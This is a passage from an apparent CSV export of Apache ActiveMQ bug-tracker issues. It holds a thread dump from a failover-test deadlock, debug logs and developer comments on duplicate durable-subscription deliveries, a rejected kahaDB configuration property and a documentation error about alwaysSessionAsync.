	- locked <0x5c2db518> (a java.lang.Object)
	at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1585)
	at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1219)
	- locked <0x5c2db520> (a org.apache.activemq.broker.region.Queue$3)
	at org.apache.activemq.broker.region.Queue.wakeup(Queue.java:1406)
	at org.apache.activemq.broker.region.Queue.addSubscription(Queue.java:377)
	at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:279)
	- locked <0x5c2db590> (a java.lang.Object)
	at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:380)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86)
	at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:89)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86)
	at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:93)
	at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:533)
	at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:300)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:178)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:216)
	- locked <0x5c2dab30> (a org.apache.activemq.transport.InactivityMonitor$1)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:204)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186)
	at java.lang.Thread.run(Thread.java:619)

""ActiveMQ Transport: tcp://localhost/127.0.0.1:61616"" prio=3 tid=0x007c9000 nid=0x2e waiting on condition [0x569fe000]
   java.lang.Thread.State: TIMED_WAITING (parking)
	at sun.misc.Unsafe.park(Native Method)
	- parking to wait for  <0x5c2b1950> (a java.util.concurrent.CountDownLatch$Sync)
	at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:198)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.doAcquireSharedNanos(AbstractQueuedSynchronizer.java:947)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireSharedNanos(AbstractQueuedSynchronizer.java:1239)
	at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:253)
	at org.apache.activemq.ActiveMQConnection.waitForTransportInterruptionProcessing(ActiveMQConnection.java:2248)
	at org.apache.activemq.ActiveMQConnection$2.processMessageDispatch(ActiveMQConnection.java:1679)
	at org.apache.activemq.command.MessageDispatch.visit(MessageDispatch.java:108)
	at org.apache.activemq.ActiveMQConnection.onCommand(ActiveMQConnection.java:1676)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)
	at org.apache.activemq.transport.failover.FailoverTransport$3.onCommand(FailoverTransport.java:168)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:216)
	- locked <0x5c2db138> (a org.apache.activemq.transport.InactivityMonitor$1)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:204)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186)
	at java.lang.Thread.run(Thread.java:619)


""ActiveMQ Session Task"" prio=3 tid=0x0076f000 nid=0x25 waiting on condition [0x55ffe000]
   java.lang.Thread.State: WAITING (parking)
	at sun.misc.Unsafe.park(Native Method)
	- parking to wait for  <0x5c2e3cd0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
	at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:1925)
	at java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:317)
	at org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:40)
	at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:87)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1262)
	at org.apache.activemq.TransactionContext.syncSendPacketWithInterruptionHandling(TransactionContext.java:666)
	at org.apache.activemq.TransactionContext.commit(TransactionContext.java:299)
	at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:558)
	at org.apache.activemq.transport.failover.FailoverConsumerOutstandingCommitTest$2.onMessage(FailoverConsumerOutstandingCommitTest.java:155)
	at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1204)
	- locked <0x5c2c6088> (a java.lang.Object)
	at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:131)
	at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:202)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:619)


""ActiveMQ Scheduler"" daemon prio=3 tid=0x006e4c00 nid=0xf waiting for monitor entry [0x573ff000]
   java.lang.Thread.State: BLOCKED (on object monitor)
	at org.apache.activemq.ActiveMQMessageConsumer.clearMessagesInProgress(ActiveMQMessageConsumer.java:661)
	- waiting to lock <0x5c2c6088> (a java.lang.Object)
	at org.apache.activemq.ActiveMQSession$2.run(ActiveMQSession.java:654)
	at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)
	at java.util.TimerThread.mainLoop(Timer.java:512)
	at java.util.TimerThread.run(Timer.java:462)

""main"" prio=3 tid=0x00030800 nid=0x2 waiting for monitor entry [0x7eb7d000]
   java.lang.Thread.State: BLOCKED (on object monitor)
	at org.apache.activemq.MessageDispatchChannel.stop(MessageDispatchChannel.java:115)
	- waiting to lock <0x5c2c6088> (a java.lang.Object)
	at org.apache.activemq.ActiveMQMessageConsumer.stop(ActiveMQMessageConsumer.java:1312)
	at org.apache.activemq.ActiveMQSession.stop(ActiveMQSession.java:1643)
	at org.apache.activemq.ActiveMQConnection.stop(ActiveMQConnection.java:544)
	- locked <0x5c2ae5d8> (a java.util.concurrent.CopyOnWriteArrayList)
	at org.apache.activemq.ActiveMQConnection.close(ActiveMQConnection.java:597)
	at org.apache.activemq.transport.failover.FailoverConsumerOutstandingCommitTest.doTestFailoverConsumerDups(FailoverConsumerOutstandingCommitTest.java:185)
	at org.apache.activemq.transport.failover.FailoverConsumerOutstandingCommitTest.testFailoverConsumerDups(FailoverConsumerOutstandingCommitTest.java:104)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:44)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:41)
	at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:20)
	at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28)
	at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:31)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:73)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:46)
	at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:180)
	at org.junit.runners.ParentRunner.access$000(ParentRunner.java:41)
	at org.junit.runners.ParentRunner$1.evaluate(ParentRunner.java:173)
	at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28)
	at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:31)
	at org.junit.runners.ParentRunner.run(ParentRunner.java:220)
	at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:62)
	at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:140)
	at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:165)
	at org.apache.maven.surefire.Surefire.run(Surefire.java:107)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:289)
	at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:1005)
{code}",loaded machine where thread creation is slow,justinpitts@gmail.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74842,,,Tue Jul 13 09:32:03 UTC 2010,,,,,,,,,,,"0|i0rq47:",159875,,,,,,,,,,,,,,,,,,,,,"12/Apr/10 14:04;gtully;resolved r933240  
prefetch=0|1 is a workaround for this issue as is this fix.;;;","13/Jul/10 08:34;eric-awl;Problem seems to be localized here 

When it works Ok : 

 09:11:02,704 [ActiveMQ Task  ] DEBUG AbstractRegion                 - localhost removing consumer: ID:td0sib01s.priv.atos.fr-53632-1279005032084-2:3:2:1 for destination: queue://FailoverWithOutstandingCommit 

2010-07-13 09:11:02,705 [127.0.0.1:61616] WARN  FailoverTransport              - Transport failed to tcp://localhost:61616 , attempting to automatically reconnect due to: java.io.EOFException 
2010-07-13 09:11:02,705 [ActiveMQ Task  ] DEBUG Queue                          - remove sub: QueueSubscription: consumer=ID:td0sib01s.priv.atos.fr-53632-1279005032084-2:3:2:1, destinations=1, dispatched=1, delivered=0, pending=0, lastDeliveredSeqId: 0, dequeues: 0, dispatched: 1, inflight: 1 
2010-07-13 09:11:02,705 [127.0.0.1:61616] DEBUG FailoverTransport              - Transport failed with the following exception: 
java.io.EOFException 
        at java.io.DataInputStream.readInt(DataInputStream.java:375) 
        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:269) 
        at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:211) 
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203) 
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186) 
        at java.lang.Thread.run(Thread.java:619) 
2010-07-13 09:11:02,705 [127.0.0.1:61616] DEBUG ActiveMQConnection             - transport interrupted, dispatchers: 1 


2010-07-13 09:11:02,706 [iveMQ Scheduler] DEBUG ActiveMQMessageConsumer        - ID:td0sib01s.priv.atos.fr-53632-1279005032084-2:3:2:1 clearing dispatched list (0) on transport interrupt 


2010-07-13 09:11:02,706 [ActiveMQ Task  ] DEBUG FailoverTransport              - urlList connectionList:[tcp://localhost:61616] 
2010-07-13 09:11:02,706 [ActiveMQ Task  ] DEBUG Queue                          - FailoverWithOutstandingCommit toPageIn: 0, Inflight: 0, pagedInMessages.size 1, enqueueSize: 1 
2010-07-13 09:11:02,706 [ActiveMQ Task  ] DEBUG FailoverTransport              - Attempting connect to: tcp://localhost:61616 

2010-07-13 09:11:02,707 [ActiveMQ Task  ] DEBUG AbstractRegion                 - localhost removing consumer: ID:td0sib01s.priv.atos.fr-53632-1279005032084-2:3:-1:1 for destination: topic://ActiveMQ.Advisory.TempQueue,topic://ActiveMQ.Advisory.TempTopic 
..... 


When it blocks 

2010-07-13 09:00:35,721 [ActiveMQ Task  ] DEBUG AbstractRegion                 - localhost removing consumer: ID:td0sib02s.priv.atos.fr-59537-1279004433513-2:0:-1:1 for destination: topic://ActiveMQ.Advisory.TempQueue,topic://ActiveMQ.Advisory.TempTopic 
... 
2010-07-13 09:00:35,722 [ActiveMQ Task  ] DEBUG AbstractRegion                 - localhost removing consumer: ID:td0sib02s.priv.atos.fr-59537-1279004433513-2:0:2:1 for destination: queue://FailoverWithOutstandingCommit 


2010-07-13 09:00:35,722 [ActiveMQ Task  ] DEBUG Queue                          - remove sub: QueueSubscription: consumer=ID:td0sib02s.priv.atos.fr-59537-1279004433513-2:0:2:1, destinations=1, dispatched=11, delivered=1, pending=0, lastDeliveredSeqId: 0, dequeues: 0, dispatched: 11, inflight: 11 
2010-07-13 09:00:35,723 [127.0.0.1:61616] WARN  FailoverTransport              - Transport failed to tcp://localhost:61616 , attempting to automatically reconnect due to: java.io.EOFException 
2010-07-13 09:00:35,724 [127.0.0.1:61616] DEBUG FailoverTransport              - Transport failed with the following exception: 

2010-07-13 09:00:35,724 [127.0.0.1:61616] DEBUG FailoverTransport              - Transport failed with the following exception: 
java.io.EOFException 
        at java.io.DataInputStream.readInt(DataInputStream.java:375) 
        at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:269) 
        at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:211) 
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203) 
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:186) 
        at java.lang.Thread.run(Thread.java:619) 
2010-07-13 09:00:35,724 [BrokerService  ] DEBUG Queue                          - FailoverWithOutstandingCommit toPageIn: 0, Inflight: 0, pagedInMessages.size 20, enqueueSize: 20 
2010-07-13 09:00:35,725 [127.0.0.1:61616] DEBUG ActiveMQConnection             - transport interrupted, dispatchers: 1 
... 
2010-07-13 09:01:05,907 [127.0.0.1:61616] WARN  ActiveMQConnection             - dispatch paused, waiting for outstanding dispatch interruption processing (1) to complete.. 
.... 


It's the way messageConsumers (and corresponding sessions) are cleared that impacts the ""transportInterruptionProcessingComplete""  countdown latch value 

Eric-AWL 

;;;","13/Jul/10 09:32;gtully;Are you seeing this failure on trunk or on the 5.3.2 branch? do you need to reopen this issue?

TRACE level debug will also help a little here. Any outstanding connection/consumer/producer is replayed by the ConnectionStateTracker and this is visible with TRACE.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Durable Subscriptions have messages replayed (duplicate messages) after network broker restart,AMQ-2691,12483281,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,09/Apr/10 10:32,09/Apr/10 10:41,14/Jul/23 05:43,09/Apr/10 10:37,5.3.0,5.3.1,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"Durable subs in a network of brokers can experience duplicate deliveries when a broker restarts.

The problem lies in duplicate suppression and missing durable acks. Give two brokers, each networked together and with a durable consumer on each. A message produced to One gets delivered locally and forwarded to the other broker where it gets delivered. The redelivery back to the originator is suppressed by a filter that sees the broker path bread crumb. However this suppressed message is not acked so the broker on restart sees an outstanding durable message for the networked broker and recovers the topic subscription, delivering duplicates.

differences in the store implementation, a store per durable sub or a shared sub store mean the issue surfaces differently.
",,mpaladin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74843,,,Fri Apr 09 10:41:37 UTC 2010,,,,,,,,,,,"0|i0rpz3:",159852,,,,,,,,,,,,,,,,,,,,,"09/Apr/10 10:37;gtully;resolved in r932342

ensuring suppressed durable deliveries are acked allows the message to be removed such that it does not get redelivered on recovery (startup);;;","09/Apr/10 10:41;gtully;Note: also change the use/effect of network connector dynamicOnly  - this flag had little effect but is now re-commissioned to indicate whether durable subs should be auto bridged (default) or whether they should be dynamic only. There is no change to the default behavior.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kahaDB: maxCheckpointMessageAddSize not accepted,AMQ-2690,12483782,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,scoopex,scoopex,08/Apr/10 06:38,04/Oct/11 13:51,14/Jul/23 05:43,04/Oct/11 13:51,5.3.1,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"I configured the following persintence adapter:

{code}
<persistenceAdapter>
   <kahaDB directory=""/srv/activemq/work/data"" 
                    journalMaxFileLength=""32mb"" indexWriteBatchSize=""10000"" 
                    indexCacheSize=""1000"" maxCheckpointMessageAddSize=""100""/>
</persistenceAdapter>
{code}

According to http://activemq.apache.org/kahadb.html the parameter maxCheckpointMessageAddSize should be usable.

If i startup the message broker i get the follwing exceptions:
{code}
# /etc/init.d/activemq fgstart
INFO: loading '/etc/default/activemq'
INFO: useing java '/usr/bin/java'
INFO: starting in foreground, this is just for debugging purposes (stop process by pressing CTRL+c)
INFO: changing to user 'activemq' to invoke java
INFO: Pushing the following environment Variables to JVM
INFO:  IBM_HEAPDUMPDIR='/var/log/activemq/' IBM_COREDIR='/var/log/activemq/' IBM_JAVACOREDIR='/var/log/activemq/'
Java Runtime: IBM Corporation 1.6.0 /usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre
  Heap sizes: current=131072k  free=126224k  max=8286208k
    JVM args: -Xjcl:jclscar_24 -Dcom.ibm.oti.vm.bootstrap.library.path=/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/amd64/default:/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/amd64 -Dsun.boot.library.path=/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/amd64/default:/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/amd64 -Djava.library.path=/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/amd64/default:/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/amd64:/usr/lib -Djava.home=/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre -Djava.ext.dirs=/usr/lib64/jvm/java-1_6_0-ibm-1.6.0/jre/lib/ext -Duser.dir=/srv/activemq/conf _j2se_j9=1119744 -Xdump -Djava.class.path=. -Xms128M -Xmx8092M -Dorg.apache.activemq.UseDedicatedTaskRunner=true -Djava.util.logging.config.file=log4j.properties -Dcom.sun.management.jmxremote.port=11099 -Dcom.sun.management.jmxremote.password.file=/srv/activemq/conf/jmx.password -Dcom.sun.management.jmxremote.access.file=/srv/activemq/conf/jmx.access -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=10.130.18.244 -Dcom.sun.management.jmxremote -Dcom.sun.management.snmp.port=30000 -Dcom.sun.management.snmp.interface=0.0.0.0 -Dcom.sun.management.snmp.acl.file=/srv/activemq/conf/snmp.acl -Dactivemq.classpath=/srv/activemq/conf/; -Dactivemq.home=/srv/activemq/install/current -Dactivemq.data=/srv/activemq/work -Dactivemq.base=/srv/activemq/install/current -Djava.class.path=/srv/activemq/install/current/bin/run.jar -Dsun.java.command=/srv/activemq/install/current/bin/run.jar start -Dsun.java.launcher=SUN_STANDARD -Dsun.java.launcher.pid=22786 _port_library _org.apache.harmony.vmi.portlib
ACTIVEMQ_HOME: /srv/activemq/install/current
ACTIVEMQ_BASE: /srv/activemq/install/current
Loading message broker from: xbean:activemq.xml
ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in file [/srv/activemq/conf/activemq.xml]: Cannot create inner bean '(inner bean)' of type [org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter] while setting bean property 'persistenceAdapter'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)#1' defined in file [/srv/activemq/conf/activemq.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'maxCheckpointMessageAddSize' of bean class [org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter]: Bean property 'maxCheckpointMessageAddSize' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in file [/srv/activemq/conf/activemq.xml]: Cannot create inner bean '(inner bean)' of type [org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter] while setting bean property 'persistenceAdapter'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)#1' defined in file [/srv/activemq/conf/activemq.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'maxCheckpointMessageAddSize' of bean class [org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter]: Bean property 'maxCheckpointMessageAddSize' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:98)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:45)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:37)
        at java.lang.reflect.Method.invoke(Method.java:599)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'org.apache.activemq.xbean.XBeanBrokerService#0' defined in file [/srv/activemq/conf/activemq.xml]: Cannot create inner bean '(inner bean)' of type [org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter] while setting bean property 'persistenceAdapter'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name '(inner bean)#1' defined in file [/srv/activemq/conf/activemq.xml]: Error setting property values; nested exception is org.springframework.beans.NotWritablePropertyException: Invalid property 'maxCheckpointMessageAddSize' of bean class [org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter]: Bean property 'maxCheckpointMessageAddSize' is not writable or has an invalid setter method. Does the parameter type of the setter match the return type of the getter?
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveInnerBean(BeanDefinitionValueResolver.java:230)
        at org.springframework.beans.factory.support.BeanDefinitionValueResolver.resolveValueIfNecessary(BeanDefinitionValueResolver.java:122)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyPropertyValues(AbstractAutowireCapableBeanFactory.java:1245)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1010)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:472)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)
        at java.security.AccessController.doPrivileged(AccessController.java:224)
        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)
        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)
        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)
        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)
        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)
{code}
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,44361,,,Tue Oct 04 13:51:05 UTC 2011,,,,,,,,,,,"0|i0akh3:",59590,,,,,,,,,,,,,,,,,,,,,"08/Apr/10 16:34;gtully;I think setJournalMaxWriteBatchSize is what you want. looks like this is a bug in the documentation. let me know it setJournalMaxWriteBatchSize works for you;;;","09/Apr/10 06:10;scoopex;Sorry, this does not work - same type of exceptions.

{code}
 <kahaDB directory=""/srv/activemq/work/data"" 
    setJournalMaxWriteBatchSize=""32mb"" 
    enableJournalDiskSyncs=""false""
    journalMaxFileLength=""32mb"" 
    indexWriteBatchSize=""10000"" 
    indexCacheSize=""1000""/>
{code};;;","09/Apr/10 08:09;gtully;The error should be a little different, about a conversion or type must be an int rather than a string. That attribute does not have the property conversion on it, that can also be fixed. currently the value needs to be a plain int, 32000 rather than Xmb
See: http://activemq.apache.org/maven/5.3.1/activemq-core/apidocs/org/apache/activemq/store/kahadb/KahaDBPersistenceAdapter.html#setJournalMaxWriteBatchSize(int) 

It needs the annotation like setJournalMaxFileLength
{code}/**
 * When set using Xbean, values of the form ""20 Mb"", ""1024kb"", and ""1g"" can be used
 * @org.apache.xbean.Property propertyEditor=""org.apache.activemq.util.MemoryIntPropertyEditor""
 */{code};;;","04/Oct/11 13:51;tabish;This has since been resolved by other work on this class.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
alwaysSessionAsync is documented incorrectly on the wiki,AMQ-2689,12483109,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,bdarfler,bdarfler,07/Apr/10 20:25,09/Jul/10 22:56,14/Jul/23 05:43,09/Jul/10 22:56,,,,,,5.4.0,,,Documentation,,,,0,,,,,,,,,"After reading through ActiveMQ in Action and talking with bsnyder It appears that 

http://activemq.apache.org/connection-configuration-uri.html

and

http://activemq.apache.org/version-5-performance-tuning.html

have the wrongdefinition for alwaysSessionAsync. 

They say that by setting it to true a separate thread would NOT be used but the OPPOSITE is true.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74844,,,Fri Jul 09 22:56:29 UTC 2010,,,,,,,,,,,"0|i0rqbr:",159909,,,,,,,,,,,,,,,,,,,,,"08/Apr/10 02:03;tjsnell;I updated both pages.;;;","04/Jun/10 20:36;bdarfler;This is also incorrect on http://activemq.apache.org/performance-tuning.html;;;","09/Jul/10 22:56;tabish;Updated the incorrect page.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
